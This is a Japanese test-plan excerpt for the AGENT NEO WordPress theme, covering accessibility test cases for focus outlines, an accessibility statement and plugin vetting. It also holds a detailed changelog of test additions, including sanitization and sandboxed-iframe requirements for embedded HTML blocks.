| TC-076 | ③ | **Accessible Hover/Focus State（outline 除去禁止）**（WCAG SC 2.4.11 Focus Appearance Min / SC 2.4.12 Enhanced） | AGENT NEO テーマ CSS が適用済み | (1) stylelint / ESLint で `outline: none` / `outline: 0` の出現を全 CSS / SCSS ファイルで検索 (2) Playwright で全フォーカス可能要素のフォーカスリング `outline-width` / `outline-color` を取得 (3) Lighthouse / axe でフォーカスインジケータ確認 | (a) `outline: none` / `outline: 0` を含む CSS ルールが 0 件（stylelint CI gate） (b) フォーカスリングが 2px 以上・コントラスト比 3:1 以上の視覚変化を持つ（axe / Playwright で確認） (c) CI で stylelint 違反があると fail | CI gate / axe | P1 |
| TC-077 | ④ | **Accessibility Statement 掲載**（WCAG 2.1 文書化要件 / W3C EARL） | AGENT NEO 管理画面またはドキュメントが参照可能 | (1) 管理画面「アクセシビリティ情報」ページを開く、またはドキュメントの accessibility-statement テンプレートを参照 (2) テンプレートの必須項目（連絡先・対応 WCAG バージョン・既知の不合格項目・代替手段）を確認 | (a) アクセシビリティ声明サンプルテンプレートが管理画面またはドキュメント内に存在すること (b) テンプレートに「対応 WCAG バージョン・既知の不合格項目・代替手段・連絡先」の 4 項目が含まれること (c) テンプレートは L4 デプロイ前に存在していること | integration / docs | P1 |
| TC-078 | ⑤ | **非アクセシブル plugin を推奨しない**（WCAG 2.1 適合方針） | AGENT NEO 管理画面「推奨プラグイン」リスト・ドキュメント内リンクが存在 | (1) 管理画面の「推奨プラグイン」リストに掲載されているプラグインを列挙 (2) 各プラグインについて **axe-core による実査**（critical / serious 違反の有無）を確認 (3) ドキュメント内の推奨プラグインリンクを同様に確認 | (a) 推奨プラグインリストに **axe-core 実査で critical / serious 違反があるプラグインが含まれないこと**（WCAG 2.2 AA 相当）（注: `accessibility-ready` タグは WordPress.org の**テーマ向けレビュータグ**であり plugin には付与されない。plugin の合否判定はタグの有無でなく axe 実査ベースで行う） (b) プラグイン選定にアクセシビリティ審査プロセス（axe 実査を含む運用規約として文書化）が存在すること (c) CI 自動化対象外（運用規約として管理）だが、L4 デプロイ前に規約文書が存在すること | integration / docs | P1 |

### 11.2 P0 / P1 / P2 分類（§11 追加分）

- **P0 追加分**: なし（新 5 要件は CI gate が P1 / 再評価期限 2026-06-30 のため P1 以下）
- **P1 追加分**: TC-074（reflow & text-spacing）/ TC-075（context-change 防止）/ TC-076（focus outline 禁止）/ TC-077（accessibility statement）/ TC-078（非アクセシブル plugin 非推奨）
- **P2 追加分**: なし

§4 P0/P1 リスト更新:

- P1 に追加: TC-074、TC-075、TC-076、TC-077、TC-078

### 11.3 GAP-RT ↔ TC マッピング（§11 追加分）

| GAP-ID | カテゴリ | カバーする TC | 残存 carry |
|---|---|---|---|
| GAP-RT-057 | a11y 新 5 要件（WordPress.org accessibility-ready 2026-05-06 改定 / WCAG 2.2 AA） | TC-074（reflow & text-spacing / SC 1.4.10 / SC 1.4.12）/ TC-075（context-change 防止 / SC 3.2.1 / SC 3.2.2）/ TC-076（focus outline 除去禁止 / SC 2.4.11 / SC 2.4.12）/ TC-077（accessibility statement 掲載 / 文書化要件）/ TC-078（非アクセシブル plugin 非推奨 / 審査プロセス） | CARRY-A11Y-001 解消（本節登録で完了）/ TC-074〜076 の CI 自動化実装は L4 carry / TC-077〜078 は運用規約・ドキュメント対応（L4 デプロイ前必須） |

### 11.4 L4 実装で実テスト化が必要な carry 一覧（§11 追加分）

| Carry-ID | 関連 TC | 理由 | 解消条件 |
|---|---|---|---|
| CARRY-A11Y-001 | TC-074〜TC-078 | WordPress.org accessibility-ready 新 5 要件の具体 TC が未登録だった（本節追加で **解消**）。CI 自動化（TC-074 Playwright reflow / TC-076 stylelint outline 禁止）は L4 CI Sprint で実テスト化 | 本節追加により CARRY-A11Y-001 の「test-plan への TC 登録」部分は **完了**。CI 自動化部分は L4 で継続管理 |

---

## 7. 変更履歴（changelog）

| 日付 | 修正者 | 内容 |
|---|---|---|
| 2026-06-18 | 実テーマギャップ監査由来 TC 追加 | §8 を新設（GAP-RT-036〜041 対応）。TC-031〜TC-060 を新規追加（30 TC）。内訳: TC-031〜036（GAP-RT-036 運用品質）/ TC-037〜041（GAP-RT-037 LLMO）/ TC-042〜046（GAP-RT-038 Consent Gate）/ TC-047〜051（GAP-RT-039 snapshot allowlist）/ TC-052〜055（GAP-RT-040 canonical+OGP 同時評価）/ TC-056〜060（GAP-RT-041 移行 SEO）。GAP-RT↔TC マッピング表（§8.8）・L4 carry 一覧（§8.9）を追記。P0 追加: TC-042/043/045/047/048/049/050。 |
| 2026-06-20 | ADR-025 由来 TC 追加 | §9 を新設（GAP-RT-055 / AI 生成コンテンツ開示法規制 / ADR-025 対応）。TC-061〜TC-065 を新規追加（5 TC）。P1 追加: TC-061〜064。P2 追加: TC-065。GAP-RT↔TC マッピング（§9.3）・L4 carry 一覧（§9.4）を追記。 |
| 2026-06-20 | ADR-026 由来 TC 追加（§10 新設） | §10 を新設（GAP-RT-058 / AI 生成 HTML 埋め込みブロック CSS 隔離 dual-mode / ADR-026 対応）。TC-066〜TC-072 を新規追加（7 TC）。P0 追加: TC-067。P1 追加: TC-066/068/069/070/072。P2 追加: TC-071。GAP-RT↔TC マッピング（§10.3）・L4 carry 一覧（§10.4）を追記。合計 76 → 83 件。 |
| 2026-06-20 | ADR-026 framing 修正（TC-073 追加） | ADR-026 の位置づけを「投稿・固定ページ双方で利用可能な標準 Gutenberg ブロック」に明確化。TC-073（固定ページ post type での block inserter 挿入・隔離レンダリング確認 / P1）を追加。§10.1 TC 表・§10.2 P1 リスト・§10.3 GAP-RT↔TC マッピング・§10.4 CARRY-EMBED-001 TC 範囲を更新。合計 83 → 84 件。 |
| 2026-06-20 | a11y 新 5 要件 TC 追加（§11 新設 / P1 修正対応） | §11 を新設（GAP-RT-057 / CARRY-A11Y-001 / WordPress.org accessibility-ready 2026-05-06 改定 新 5 要件）。TC-074〜TC-078 を新規追加（5 TC）。§10 は ADR-026 / GAP-RT-058 埋め込みブロック専用のため §11 として独立分節。P1 追加: TC-074（reflow & text-spacing）/ TC-075（context-change 防止）/ TC-076（focus outline 禁止）/ TC-077（accessibility statement）/ TC-078（非アクセシブル plugin 非推奨）。CARRY-A11Y-001 の「test-plan への TC 登録」部分を完了。§4 P1 リスト更新。合計 84 → 89 件。 |
| 2026-06-20 | TC-072 sanitize 方針 mode 別分割（Codex TL レビュー P1 是正）→ 案A（別オリジン iframe）へ転換是正 | TC-072 受入条件をモード別に分割。旧: `<script>` を無条件除去。新: mode=static は `wp_kses` / DOMPurify 等で `<script>`・イベントハンドラ・`javascript:` URL を除去（JS 不実行）/ mode=interactive は別オリジン sandbox-origin の embed URL を指す iframe を出力するのみ（untrusted HTML/JS を保持しない・srcdoc / 直接 HTML POST の受け口は廃止）・防御境界は frame-src allowlist（sandbox-origin のみ）+ sandbox 属性（allow-same-origin 不含）で担保。前提条件欄の `srcdoc` / `直接 POST` 旧記述を削除。ADR-026 セキュリティ節（§2）に同方針を明記。TC 採番変更なし / 件数変更なし（89 件維持）。 |
| 2026-06-20 | TC-074 無効 CSS プロパティ修正（Codex TL レビュー P2 是正） | TC-074 手順(2) の `paragraph-spacing: 2em` を削除。`paragraph-spacing` は CSS プロパティとして存在しない（WCAG SC 1.4.12 段落間隔要件が実質スルーされていた）。正しくは段落要素（`p`）の `margin-block: 2em`（フォントサイズの 2 倍）で適用することを明記。受入条件に WCAG SC 1.4.12 の 4 軸（line-height ≥ 1.5 / letter-spacing ≥ 0.12em / word-spacing ≥ 0.16em / 段落間隔 ≥ フォントサイズ × 2）を明示追加。 |
| 2026-06-20 | TC-066 dual-mode 拡張 + ADR-026 storage bridge 禁止化（Codex TL レビュー P2×2 是正 / 8巡目） | **P2-1**: TC-066 を「dual-mode の CSS 非干渉（interactive=iframe / static=Shadow DOM 両方）」に拡張。旧: mode=interactive の iframe のみ検証。新: mode=static（Shadow DOM）の CSS 隔離検証を追加（(c) shadow root 内要素への テーマ CSS 侵入なし / (d) shadow 内 CSS の light DOM・他ブロックへの漏洩なし）。前提条件・手順・受入条件を dual-mode 記述に更新。ADR-026 TC サマリ表の TC-066 行も同内容で更新。TC 採番・件数変更なし（89 件維持）。**P2-2**: ADR-026 §Consequences 「untrusted JS のサンドボックス必須」を更新。旧「postMessage 経由で親側 localStorage を利用する設計とするが、L4 carry」を「親 localStorage bridge は原則禁止。汎用 storage API（任意キー/任意値 read/write）化は不変制約。永続化が必要な場合でも namespace 固定 + 値 schema 検証 + write 専用（read 不可）等の厳格プロトコルに限定。デフォルトは bridge なし方針を優先。制約として CARRY-EMBED-002 に引き継ぐ」に改訂。 |
| 2026-06-20 | TC-066 Shadow DOM 継承プロパティ明示リセット前提化（Codex TL レビュー P2×1 是正 / 9巡目） | TC-066 受入条件 (c) を修正。旧: 「shadow root 内要素の `computed style` にテーマ CSS（`font-family` / `color` 等）が侵入していない（Shadow DOM の CSS encapsulation が機能している）」。新: 「shadow root に明示 host リセット（`:host { all: initial }` 等）が適用され、その結果 shadow 内要素の `computed style` がテーマの継承プロパティを引き継いでいないこと。リセット**なしに** Shadow DOM だけで継承が止まるという誤前提で検証しない」。手順 (5) 直前に「shadow root への `:host { all: initial }` 等の明示リセット適用確認」ステップを追加（旧手順 (5)→(6)、(6)→(7) に繰り下げ）。ADR-026 §mode=static 設計原則に「継承プロパティは host 経由で既定継承される / 完全視覚隔離には明示リセット必須」の事実を追記。ADR-026 TC サマリ表の TC-066 (b) 記述も同方針で更新。TC 採番・件数変更なし（89 件維持）。リセット適用範囲の具体化は CARRY-EMBED-004 (L4 carry) に引き継ぎ。 |
| 2026-06-15 | L4着手前敵対検証修正 | TC-017 → TC-017a / TC-017b に分割（i18n/RTL gate + sanitize_title 分離単体テスト）。TC-025 受入条件を強化（`sanitize_slug()` `[a-z0-9-]` 正規化・単体テスト必須、ログ化のみ合格不可）。TC-027（SBOM gate / P1）を新設。TC-028（Lighthouse CI render-blocking / consent / P1）新設。TC-029（lp-blueprint 12セクション整合 / P1）新設。TC-030（bridge-profile safe_apply_state / ADR-019準拠 / P1）新設。TC-011 に P0 シナリオ追加（ライセンスサーバ 502 / deny-first / TB-18a 準拠）、優先度を P1 → P0 に昇格。§5 carry テーブルを全面是正: 列に TC 参照列を追加、carry-006/011/012/014/021 を新規追加、carry-013→TC-017b、carry-015→TC-027、carry-017→TC-023a、carry-025→TC-023b に参照修正。§4 P0/P1 リスト整合。 |

| 2026-06-20 | REQ-F-036 是正 / TC-074 scrollWidth 修正 / TC-079 egress 追加（PO 要件意図是正） | **REQ-F-036 (7) 是正**: 「JS 禁止（無条件）」→「JS 性能規律（テーマ本体を重くしない原則 / REQ-NF-001e 準拠 / sandboxed iframe 内 JS は許可）」に方針転換。TC-074 受入条件 (a) の `document.body.scrollWidth` 単独チェックを `Math.max(document.documentElement.scrollWidth, document.body.scrollWidth)` または `document.scrollingElement.scrollWidth` に修正（standards-mode での横溢れ見逃し防止 / TL P2 指摘）。TC-079 を新設（ADR-026 §2 egress 制御 / `connect-src` / `img-src` / `form-action` CSP allowlist 確認 / P1 / TL P1 egress 残指摘対応）。§4 P1 リスト更新（TC-079 追加）。§10 TC 表・P1 リスト・GAP-RT↔TC マッピング・CARRY-EMBED-003 TC 範囲を更新。合計 89 → 90 件。 |

**本ファイルが TC / CAT 件数の正本（2026-06-20 時点）**

- CAT 系: CAT-001〜CAT-009 = **9 件**
- TC 系（§3.2 既存）: TC-001〜TC-030（TC-017a / TC-017b を個別カウント、TC-023a / TC-023b を個別カウント）= **32 件**
- TC 系（§8 追加）: TC-031〜TC-060 = **30 件**
  - TC-031〜036: GAP-RT-036 運用品質（6 件）
  - TC-037〜041: GAP-RT-037 LLMO（5 件）
  - TC-042〜046: GAP-RT-038 Consent Gate（5 件）
  - TC-047〜051: GAP-RT-039 snapshot allowlist（5 件）
  - TC-052〜055: GAP-RT-040 canonical+OGP 同時評価（4 件）
  - TC-056〜060: GAP-RT-041 移行 SEO（5 件）
- TC 系（§9 追加）: TC-061〜TC-065 = **5 件**
  - TC-061〜065: GAP-RT-055 AI 生成コンテンツ開示法規制（ADR-025）（5 件）
- TC 系（§10 追加）: TC-066〜TC-073 / TC-079 = **9 件**
  - TC-066〜073: GAP-RT-058 AI 生成 HTML 埋め込みブロック CSS 隔離 dual-mode（ADR-026）（8 件）
  - TC-079: ADR-026 egress 制御 / CSP allowlist 確認（1 件 / TC-078 後に採番 skip で TC-079 を使用）
- TC 系（§11 追加）: TC-074〜TC-078 = **5 件**
  - TC-074〜078: GAP-RT-057 a11y 新 5 要件（WordPress.org accessibility-ready 2026-05-06 改定）（5 件）
- **合計: 90 件（CAT 9 + TC 81）**

※ 旧来の「41 件」は 2026-06-15 時点の件数。2026-06-18 追加分 30 件 + 2026-06-20 追加分（§9）5 件 + 2026-06-20 追加分（§10）7 件 + 2026-06-20 ADR-026 framing 修正時追加（TC-073）1 件 + 2026-06-20 §11 追加分（TC-074〜078）5 件を加算し 89 件。本修正（2026-06-20 REQ-F-036 是正対応）で TC-079（egress allowlist）1 件追加し 90 件が正本。
